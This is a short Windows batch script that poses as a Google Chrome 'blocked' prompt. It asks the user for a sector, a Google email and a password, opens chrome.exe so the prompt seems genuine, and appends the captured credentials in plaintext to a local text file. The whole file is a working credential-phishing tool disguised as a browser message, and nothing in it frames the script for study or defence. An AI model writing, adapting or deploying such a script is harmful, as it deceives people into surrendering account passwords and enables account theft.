@echo off

color f
title Google Chrome
mode 60,10
cls

echo.
echo 	###########################
echo 	# Google Chorme Blocked #
echo 	###########################
echo.
echo Enter your sector:
set /p name=Sector:
cls

echo.
echo 	###########################
echo 	# Google Chorme Blocked #
echo 	###########################
echo.
echo Enter your Google Email
set /p us=E-mail:
cls

echo.
echo 	###########################
echo 	# Google Chorme Blocked #
echo 	###########################
echo.
echo Inform your password
set /p pass=Type your password:
cls


msg * Thank you for using Google Chrome.
start chrome.exe
echo dia %date% Hour %time%  %n% Email: %us% Name: %name% Password:%pass%    >>"C:\ES\Script\Data\%n%.txt"
ping locallhost -n 2 >nul
